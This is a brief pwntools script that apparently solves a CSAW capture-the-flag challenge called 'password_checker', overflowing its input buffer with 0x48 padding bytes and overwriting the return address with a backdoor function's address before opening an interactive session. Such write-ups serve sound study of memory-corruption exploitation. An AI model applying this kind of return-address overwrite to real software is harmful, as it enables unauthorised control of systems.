#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 0
if local:
    p = process('./password_checker')
else:
    p = remote('pwn.chal.csaw.io', 5000)

backdoor = 0x401172

#gdb.attach(p, 'b *0x401247\nc')

p.recvuntil('Enter the password to get in: \n>')
payload = 'A' * 0x48 + p64(backdoor)
p.sendline(payload)

p.interactive()

